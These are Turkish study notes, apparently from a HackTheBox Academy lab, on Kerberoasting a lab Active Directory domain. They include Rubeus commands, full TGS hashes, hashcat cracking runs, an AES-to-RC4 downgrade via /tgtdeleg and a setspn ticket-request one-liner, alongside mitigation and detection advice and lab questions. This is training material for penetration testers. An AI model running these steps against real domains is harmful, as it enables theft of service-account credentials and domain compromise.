[*] PwdLastSet             : 2/15/2022 2:15:40 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E
```


### Şifreleme Türleri Hakkında Bir Not
 Şifreleme türleriyle ilgili aşağıdaki örnekler, hedef Domain Controller Windows Server 2019 çalıştırdığı için modül laboratuvarında yeniden üretilemez. Bu konuda daha fazla bilgiyi bölümün ilerleyen kısımlarında bulabilirsiniz.

Kerberoasting araçları genellikle saldırıyı gerçekleştirirken ve TGS-REQ isteklerini başlatırken RC4 şifrelemesi talep eder. Bunun nedeni RC4'ün AES-128 ve AES-256 gibi diğer şifreleme algoritmalarına göre daha [zayıf](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) olması ve Hashcat gibi araçlar kullanılarak çevrimdışı olarak kırılmasının daha kolay olmasıdır. Çoğu ortamda Kerberoasting gerçekleştirirken, RC4 (tip 23) şifrelenmiş bir bilet olan $krb5tgs$23$* ile başlayan hash'ler alırız. Bazen $krb5tgs$18$* ile başlayan bir AES-256 (tip 18) şifrelenmiş hash veya hash alırız. Hashcat kullanarak AES-128 (tip 17) ve AES-256 (tip 18) TGS biletlerini kırmak mümkün olsa da, genellikle RC4 (tip 23) şifreli bir bileti kırmaktan çok daha fazla zaman alacaktır, ancak özellikle zayıf bir şifre seçilirse yine de mümkündür. Bir örnek üzerinden gidelim.

Bunu test etmek için testspn adında bir SPN hesabı oluşturarak ve bu kullanıcıyı Kerberoast yapmak için Rubeus kullanarak başlayalım. Gördüğümüz gibi, TGS biletini RC4 (tip 23) şifrelenmiş olarak aldık.

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$4A8E252D305475EB9410FF3E1E99517F90E27FB588173ACE3651DEACCDEC62165DE6EA1E6337F3640632FA42419A535B501ED1D4D1A0B704AA2C56880D74C2940170DC0747CE4D05B420D76BF298226AADB53F2AA048BE813B5F0CA7A85A9BB8C7F70F16F746807D3B84AA8FE91B8C38AF75FB9DA49ED133168760D004781963DB257C2339FD82B95C5E1F8F8C4BD03A9FA12E87E278915A8362DA835B9A746082368A155EBB5EFB141DC58F2E46B7545F82278AF4214E1979B35971795A3C4653764F08C1E2A4A1EDA04B1526079E6423C34F88BDF6FA2477D28C71C5A55FA7E1EA86D93565508081E1946D796C0B3E6666259FEB53804B8716D6D076656BA9D392CB747AD3FB572D7CE130940C7A6415ADDB510E2726B3ACFA485DF5B7CE6769EEEF08FE7290539830F6DA25C359894E85A1BCFB7E0B03852C7578CB52E753A23BE59AB9D1626091376BA474E4BAFAF6EBDD852B1854FF46AA6CD1F7F044A90C9497BB60951C4E82033406ACC9B4BED7A1C1AFEF41316A58487AFEA4D5C07940C87367A39E66415D9A54B1A88DADE1D4A0D13ED9E474BDA5A865200E8F111996B846E4E64F38482CEE8BE4FC2DC1952BFFBD221D7284EFF27327C0764DF4CF68065385D31866DA1BB1A189E9F82C46316095129F06B3679EE1754E9FD599EB9FE96C10315F6C45300ECCBEB6DC83A92F6C08937A244C458DB69B80CE85F0101177E6AC049C9F11701E928685F41E850CA62F047B175ADCA78DCA2171429028CD1B4FFABE2949133A32FB6A6DC9E0477D5D994F3B3E7251FA8F3DA34C58FAAE20FC6BF94CC9C10327984475D7EABE9242D3F66F81CFA90286B2BA261EBF703ADFDF7079B340D9F3B9B17173EBA3624D9B458A5BD1CB7AF06749FF3DB312BCE9D93CD9F34F3FE913400655B4B6F7E7539399A2AFA45BD60427EA7958AB6128788A8C0588023DDD9CAA4D35459E9DEE986FD178EB14C2B8300C80931624044C3666669A68A665A72A1E3ABC73E7CB40F6F46245B206777EE1EF43B3625C9F33E45807360998B7694DC2C70ED47B45172FA3160FFABAA317A203660F26C2835510787FD591E2C1E8D0B0E775FC54E44A5C8E5FD1123FBEDB463DAFDFE6A2632773C3A1652970B491EC7744757872C1DDC22BAA7B4723FEC91C154B0B4262637518D264ADB691B7479C556F1D10CAF53CB7C5606797F0E00B759FCA56797AAA6D259A47FCCAA632238A4553DC847E0A707216F0AE9FF5E2B4692951DA4442DF86CD7B10A65B786FE3BFC658CC82B47D9C256592942343D05A6F06D250265E6CB917544F7C87645FEEFA54545FEC478ADA01B8E7FB6480DE7178016C9DC8B7E1CE08D8FA7178D33E137A8C076D097C1C29250673D28CA7063C68D592C30DCEB94B1D93CD9F18A2544FFCC07470F822E783E5916EAF251DFA9726AAB0ABAC6B1EB2C3BF6DBE4C4F3DE484A9B0E06FF641B829B651DD2AB6F6CA145399120E1464BEA80DC3608B6C8C14F244CBAA083443EB59D9EF3599FCA72C6997C824B87CF7F7EF6621B3EAA5AA0119177FC480A20B82203081609E42748920274FEBB94C3826D57C78AD93F04400DC9626CF978225C51A889224E3ED9E3BFDF6A4D6998C16D414947F9E157CB1594B268BE470D6FB489C2C6C56D2AD564959C5
```

PowerView ile kontrol ettiğimizde, msDS-SupportedEncryptionTypes özniteliğinin 0 olarak ayarlandığını görebiliriz. [Buradaki](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) grafik bize 0 ondalık değerinin belirli bir şifreleme türünün tanımlanmadığı ve varsayılan RC4_HMAC_MD5 olarak ayarlandığı anlamına geldiğini söyler.

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            0 testspn
```

Şimdi, Hashcat kullanarak bu bileti kıralım ve ne kadar sürdüğünü not edelim. Hesap, amaçlarımız doğrultusunda rockyou.txt kelime listesinde bulunan zayıf bir parola ile ayarlanmıştır. Bunu Hashcat'te çalıştırdığımızda, bir CPU'da kırılmasının dört saniye sürdüğünü ve bu nedenle güçlü bir GPU kırma donanımında ve muhtemelen tek bir GPU'da bile neredeyse anında kırılacağını görüyoruz.


### Hashcat ve rockyou.txt ile Ticket'ı Kırma

```shell-session
M1R4CKCK@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>64bea80dc3608b6c8c14f244cbaa083443eb59d9ef3599fca72c6997c824b87cf7f7ef6621b3eaa5aa0119177fc480a20b82203081609e42748920274febb94c3826d57c78ad93f04400dc9626cf978225c51a889224e3ed9e3bfdf6a4d6998c16d414947f9e157cb1594b268be470d6fb489c2c6c56d2ad564959c5:welcome1$
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/ke...4959c5
Time.Started.....: Sun Feb 27 15:36:58 2022 (4 secs)
Time.Estimated...: Sun Feb 27 15:37:02 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   693.3 kH/s (5.41ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2789376/14344385 (19.45%)
Rejected.........: 0/2789376 (0.00%)
Restore.Point....: 2777088/14344385 (19.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: westham76 -> wejustare

Started: Sun Feb 27 15:36:57 2022
Stopped: Sun Feb 27 15:37:04 2022
```

Müşterimizin SPN hesaplarını AES 128/256 şifrelemeyi destekleyecek şekilde ayarladığını varsayalım.

![Pasted image 20241021124649.png](/img/user/resimler/Pasted%20image%2020241021124649.png)

Bunu PowerView ile kontrol edersek, msDS-SupportedEncryptionTypes özniteliğinin 24 olarak ayarlandığını görürüz, yani AES 128/256 şifreleme türleri yalnızca desteklenenlerdir.


### Desteklenen Şifreleme Türlerini Kontrol Etme
```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            24 testspn
```

Rubeus ile yeni bir bilet talep etmek bize hesap adının AES-256 (tip 18) şifreleme kullandığını gösterecektir.



### Yeni Bilet Talep Etme
```powershell-session
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$8939F8C5B97A4CAA170AD706$84B0DD2C5A931E123918FFD64561BFE651F89F079A47053814244C0ECDF15DF136E5787FAC4341A1BDF6D5077EAF155A75ACF0127A167ABE4B2324C492ED1AF4C71FF8D51927B23656FCDE36C9A7AC3467E4DB6B7DC261310ED05FB7C73089763558DE53827C545FB93D25FF00B5D89FCBC3BBC6DDE9324093A3AADBE2C6FE21CFB5AFBA9DCC5D395A97768348ECCF6863EFFB4E708A1B55759095CCA98DE7DE0F7C149357365FBA1B73FCC40E2889EA75B9D90B21F121B5788E27F2FC8E5E35828A456E8AF0961435D62B14BADABD85D4103CC071A07C6F6080C0430509F8C4CDAEE95F6BCC1E3618F2FA054AF97D9ED04B47DABA316DAE09541AC8E45D739E76246769E75B4AA742F0558C66E74D142A98E1592D9E48CA727384EC9C3E8B7489D13FB1FDB817B3D553C9C00FA2AC399BB2501C2D79FBF3AF156528D4BECD6FF03267FB6E96E56F013757961F6E43838054F35AE5A1B413F610AC1474A57DE8A8ED9BF5DE9706CCDAD97C18E310EBD92E1C6CD5A3DE7518A33FADB37AE6672D15DACFE44208BAC2EABB729C24A193602C3739E2C21FB606D1337E1599233794674608FECE1C92142723DFAD238C9E1CB0091519F68242FBCC75635146605FDAD6B85103B3AFA8571D3727F11F05896103CB65A8DDE6EB29DABB0031DCF03E4B6D6F7D10E85E02A55A80CD8C93E6C8C3ED9F8A981BBEA01ABDEB306078973FE35107A297AF3985CF12661C2B8614D136B4AF196D27396C21859F40348639CD1503F517D141E2E20BB5F78818A1A46A0F63DD00FEF2C1785672B4308AE1C83ECD0125F30A2708A273B8CC43D6E386F3E1A520E349273B564E156D8EE7601A85D93CF20F20A21F0CF467DC0466EE458352698B6F67BAA9D65207B87F5E6F61FF3623D46A1911342C0D80D7896773105FEC33E5C15DB1FF46F81895E32460EEA32F423395B60582571551FF74D1516DDA3C3EBAE87E92F20AC9799BED20BF75F462F3B7D56DA6A6964B7A202FE69D9ED62E9CB115E5B0A50D5BBF2FD6A22086D6B720E1589C41FABFA4B2CD6F0EFFC9510EC10E3D4A2BEE80E817529483D81BE11DA81BBB5845FEC16801455B234B796728A296C65EE1077ABCF67A48B96C4BD3C90519DA6FF54049DE0BD72787F428E8707A5A46063CE57E890FC22687C4A1CF6BA30A0CA4AB97E22C92A095140E37917C944EDCB64535166A5FA313CEF6EEB5295F9B8872D398973362F218DF39B55979BDD1DAD5EC8D7C4F6D5E1BD09D87917B4562641258D1DFE0003D2CC5E7BCA5A0FC1FEC2398B1FE28079309BEC04AB32D61C00781C92623CA2D638D1923B3A94F811641E144E17E9E3FFB80C14F5DD1CBAB7A9B53FB5895DFC70A32C65A9996FB9752B147AFB9B1DFCBECA37244A88CCBD36FB1BF38822E42C7B56BB9752A30D6C8198B6D64FD08A2B5967414320D532F0404B3920A5F94352F85205155A7FA7EB6BE5D3A6D730318FE0BF60187A23FF24A84C18E8FC62DF6962D91D2A9A0F380987D727090949FEC4ADC0EF29C7436034A0B9D91BA36CC1D4C457392F388AB17E646418BA9D2C736B0E890CF20D425F6D125EDD9EFCA0C3DA5A6E203D65C8868EE3EC87B853398F77B91DDCF66BD942EC17CF98B6F9A81389489FCB60349163E10196843F43037E79E10794AC70F88225EDED2D51D26413D53
```

Bunu Hashcat üzerinden çalıştırmak için, kullanışlı Hashcat [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) tablosuna göre Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) olan 19700 hash modunu kullanmamız gerekir. AES hash'ini aşağıdaki gibi çalıştırıyoruz ve durumu kontrol ediyoruz, bu da kırma işinin durumunu görmek için s yazarak rockyou.txt kelime listesinin tamamını çalıştırmanın 23 dakikadan fazla sürmesi gerektiğini gösteriyor.


### Hashcat'i Çalıştırma ve Kırma İşinin Durumunu Kontrol Etme

```shell-session
M1R4CKCK@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: Kerberos 5, etype 18, TGS-REP
Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53
Time.Started.....: Sun Feb 27 16:07:50 2022 (57 secs)
Time.Estimated...: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10277 H/s (8.99ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 583680/14344385 (4.07%)
Rejected.........: 0/583680 (0.00%)
Restore.Point....: 583680/14344385 (4.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3264-3328
Candidates.#1....: skitzy -> sammy<3

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>
```

Hash sonunda kırıldığında, bir CPU'da nispeten basit bir parola için 4 dakika 36 saniye sürdüğünü görüyoruz. Bu, daha güçlü/uzun bir parola ile büyük ölçüde artacaktır.


### Crack için Geçen Sürenin Uzunluğunu Görüntüleme
```shell-session
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 18, TGS-REP
Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53
Time.Started.....: Sun Feb 27 16:07:50 2022 (4 mins, 36 secs)
Time.Estimated...: Sun Feb 27 16:12:26 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10114 H/s (9.25ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2789376/14344385 (19.45%)
Rejected.........: 0/2789376 (0.00%)
Restore.Point....: 2783232/14344385 (19.40%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4032-4095
Candidates.#1....: wenses28 -> wejustare
```

Yeni bir servis bileti talep ederken sadece RC4 şifrelemesi istediğimizi belirtmek için Rubeus'u ==/tgtdeleg== bayrağı ile kullanabiliriz. Araç bunu, TGS isteğinin gövdesinde desteklediğimiz tek algoritma olarak RC4 şifrelemesini belirterek yapar. Bu, geriye dönük uyumluluk için Active Directory'de yerleşik olarak bulunan bir hata önleyici olabilir. Bu bayrağı kullanarak, çok daha hızlı kırılabilen RC4 (tip 23) şifreli bir bilet talep edebiliriz.


#### Using the /tgtdeleg Flag
![Pasted image 20241021125043.png](/img/user/resimler/Pasted%20image%2020241021125043.png)

Yukarıdaki görüntüde, /tgtdeleg bayrağı sağlandığında, desteklenen şifreleme türleri AES 128/256 olarak listelenmesine rağmen aracın bir RC4 bileti talep ettiğini görebiliriz. Bu basit örnek, Kerberoasting gibi saldırılar gerçekleştirirken ayrıntılı numaralandırmanın ve daha derine inmenin önemini göstermektedir. Burada AES'den RC4'e geçebilir ve kırma süresini 4 dakika 30 saniyeden fazla kısaltabiliriz. Elimizde güçlü bir GPU parola kırma teçhizatının bulunduğu gerçek dünya etkileşiminde, bu tür bir düşürme, birkaç gün yerine birkaç saat içinde bir hash kırılmasıyla sonuçlanabilir ve değerlendirmemizi yapabilir veya bozabilir.

### 1. **Windows Server 2019 Domain Controller ile Kerberoasting Saldırıları**

- **Domain fonksiyonel seviyesi fark etmez**: Windows Server 2019'daki bir **Domain Controller** (DC) üzerinde, hedeflenen hesap hangi şifreleme yöntemini destekliyorsa **en yüksek düzeydeki şifreleme** kullanılacaktır.
- Bu, saldırganın **her zaman güçlü bir şifreleme algoritmasıyla şifrelenmiş** bir hizmet bileti (Kerberos TGS bileti) alacağı anlamına gelir. Bu da bileti kırmayı zorlaştırır.

### 2. **Windows Server 2016 veya Öncesi Domain Controller ile Durum**:

- **Eski sürüm Domain Controller'lar yaygındır**: Bir saldırgan, **Windows Server 2016 veya daha önceki sürümlerde** çalışan bir Domain Controller’a karşı Kerberoasting saldırısı yapıyorsa, şifreleme yöntemi saldırının sonucunu etkileyebilir.
- **AES yerine RC4 şifreleme**: Eğer **AES şifrelemesi etkinleştirilmemişse**, saldırgan daha zayıf olan **RC4 şifreleme algoritmasıyla** şifrelenmiş bir hizmet bileti isteyebilir. **RC4** algoritması daha eski ve kırılması daha kolaydır, bu yüzden saldırganlar için avantajlıdır.

### 3. **AES Şifrelemesi Etkinleştirildiğinde**:

- **AES Şifreleme Güçlüdür**: Eğer **AES şifreleme** etkinse, biletler daha güçlü şifreleme algoritmalarıyla (örneğin **AES-256** veya **AES-128**) şifrelenir. Özellikle **AES-256** (tip 18) şifreleme, kırılması oldukça zor bir algoritmadır. Bu, saldırganın bileti brute-force (kaba kuvvet) yöntemiyle kırmasını zorlaştırır.
- **Zayıf parolalar hâlâ risklidir**: Ancak, zayıf parolalar kullanılıyorsa, **AES-256 bile olsa**, saldırgan bir sözlük saldırısı (wordlist attack) ile bileti kırmayı deneyebilir. Bu şifreleme türü daha güçlü olsa da **imkânsız değildir**.

### Özet:

- **Windows Server 2019**'da, her zaman en güçlü şifreleme kullanılır ve bu yüzden Kerberoasting saldırıları daha zor olur.
- **Windows Server 2016 veya öncesi** sunucularda, AES etkin değilse saldırgan RC4 gibi daha zayıf algoritmaları kullanarak şifrelenmiş bilet talep edebilir ve bu durum saldırıyı kolaylaştırır.
- **AES-256** ile şifrelenmiş biletler, özellikle zayıf parolalar kullanıldığında kırılmaya karşı hâlâ risk altında olabilir, ancak güçlü AES şifrelemesi genellikle saldırıyı büyük ölçüde zorlaştırır.


Kerberos tarafından kullanılan şifreleme türlerini düzenlemek mümkündür. Bu, Group Policy (Grup İlkesi) açılarak, Default Domain Policy (Varsayılan Etki Alanı İlkesi) düzenlenerek ve seçilerek yapılabilir: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options (Bilgisayar Yapılandırması > Policies > Windows Ayarları > Security Settings > Local Policies > Security Options) öğelerini seçip Network security (Ağ güvenliği) öğesine çift tıklayarak yapılabilir: Kerberos için izin verilen şifreleme türlerini yapılandır ve Kerberos için izin verilen istenen şifreleme türünü seç. RC4_HMAC_MD5 hariç diğer tüm şifreleme türlerinin kaldırılması, yukarıdaki sürüm düşürme örneğinin 2019'da gerçekleşmesini sağlayacaktır. AES desteğinin kaldırılması AD'ye bir güvenlik açığı getirecektir ve muhtemelen asla yapılmamalıdır. Ayrıca, Domain Controller Windows Server sürümü veya domain fonksiyonel seviyesi ne olursa olsun RC4 desteğinin kaldırılmasının operasyonel etkileri olabilir ve uygulamadan önce iyice test edilmelidir.

![Pasted image 20241021125523.png](/img/user/resimler/Pasted%20image%2020241021125523.png)


### Mitigation & Detection
Yönetilmeyen servis hesapları için önemli bir hafifletme, herhangi bir kelime listesinde görünmeyen ve kırılması çok uzun sürecek uzun ve karmaşık bir parola veya parola belirlemektir. Bununla birlikte, çok karmaşık parolalar kullanan ve belirli bir aralıkta otomatik olarak dönen (makine hesapları gibi) [Managed Service Accounts](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009) (MSA) ve [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) (gMSA) veya LAPS ile ayarlanmış hesapların kullanılması önerilir.

Kerberoasting, RC4 şifrelemeli Kerberos TGS biletleri talep eder ve bu, bir domain içindeki Kerberos etkinliğinin çoğunluğu olmamalıdır. Ortamda Kerberoasting gerçekleştiğinde, otomatik Kerberoasting araçlarının kullanıldığına işaret eden anormal sayıda `TGS-REQ` ve `TGS-REP` isteği ve yanıtı göreceğiz. Domain controller, Group Policy içinde [Audit Kerberos Service Ticket Operations](“https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations”) seçilerek Kerberos TGS ticket isteklerini günlüğe kaydedecek şekilde yapılandırılabilir.

![Pasted image 20241021130305.png](/img/user/resimler/Pasted%20image%2020241021130305.png)

Bunu yapmak iki ayrı olay kimliği oluşturacaktır: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): Bir Kerberos hizmet bileti talep edildi ve [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): Bir Kerberos hizmet bileti yenilendi. Belirli bir ortamda belirli bir hesap için 10-20 Kerberos TGS isteği normal kabul edilebilir. Kısa bir süre içinde bir hesaptan gelen çok sayıda 4769 olay kimliği bir saldırıya işaret edebilir.  

Aşağıda günlüğe kaydedilen bir Kerberoasting saldırısı örneği görebilirsiniz. Anormal bir davranış gibi görünen 4769 numaralı birçok olayın art arda kaydedildiğini görüyoruz. Bir tanesine tıkladığımızda, `htb-student` kullanıcısı (saldırgan) tarafından `sqldev` hesabı (hedef) için bir Kerberos hizmet bileti talep edildiğini görebiliriz. Bilet şifreleme türünün `0x17` olduğunu da görebiliriz, bu da 23 (`DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256`) için hex değeridir, yani istenen biletin RC4 olduğu anlamına gelir, bu nedenle parola zayıfsa, saldırganın bunu kırması ve `sqldev` hesabının kontrolünü ele geçirmesi için iyi bir şans vardır.

![Pasted image 20241021130349.png](/img/user/resimler/Pasted%20image%2020241021130349.png)

Diğer bazı düzeltme adımları arasında, özellikle servis hesapları tarafından yapılan Kerberos talepleri için RC4 algoritmasının kullanımının kısıtlanması yer alır. Ortamda hiçbir şeyin bozulmadığından emin olmak için bu test edilmelidir. Ayrıca, Domain Admins ve diğer yüksek ayrıcalıklı hesaplar SPN hesabı olarak kullanılmamalıdır (eğer ortamda SPN hesaplarının bulunması gerekiyorsa).  

Sean Metcalf tarafından yazılan bu mükemmel [yazı](https://adsecurity.org/?p=3458) Kerberoasting için bazı hafifletme ve tespit stratejilerini vurgulamaktadır.


## **İlerlemeye Devam**  

Artık bir dizi (umarım ayrıcalıklı) kimlik bilgisine sahip olduğumuza göre, kimlik bilgilerini nerede kullanabileceğimizi görmeye devam edebiliriz. Şunları yapabiliriz:  

- Bir host'a RDP veya WinRM üzerinden local kullanıcı veya local admin olarak erişmek  
    
- PsExec gibi bir araç kullanarak uzak bir hostta yönetici olarak kimlik doğrulama  
    
- Hassas bir dosya paylaşımına erişim elde etme  
    
- DBA kullanıcısı olarak bir host'a MSSQL erişimi elde edin, bu erişim daha sonra ayrıcalıkları yükseltmek için kullanılabilir  
    

Erişimimiz ne olursa olsun, erişimimizi genişletmemize ve müşterilerimize daha fazla değer sağlamak için raporumuza eklememize yardımcı olabilecek diğer kusurlar ve yanlış yapılandırmalar için etki alanını daha derinlemesine araştırmak isteyeceğiz.

Soru : SPN 'vmware/inlanefreight.local' ile servis hesabının adı nedir?
Cevap : 


1-

PS C:\htb> Add-Type -AssemblyName System.IdentityModel

PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

![Pasted image 20241021201605.png](/img/user/resimler/Pasted%20image%2020241021201605.png)


![Pasted image 20241021203740.png](/img/user/resimler/Pasted%20image%2020241021203740.png)




Soru  : Bu hesabın şifresini kırın ve cevabınız olarak gönderin.
Cevap : 





# **Access Control List (ACL) Kötüye Kullanım Kılavuzu**
Güvenlik nedeniyle, bir AD ortamındaki tüm kullanıcılar ve bilgisayarlar tüm nesnelere ve dosyalara erişemez. Bu tür izinler Erişim Kontrol Listeleri (ACL'ler) aracılığıyla kontrol edilir. Etki alanının güvenlik duruşu için ciddi bir tehdit oluşturan bir ACL'deki küçük bir yanlış yapılandırma, izinleri ihtiyacı olmayan diğer nesnelere sızdırabilir.



## **Access Control List (ACL) Overview**
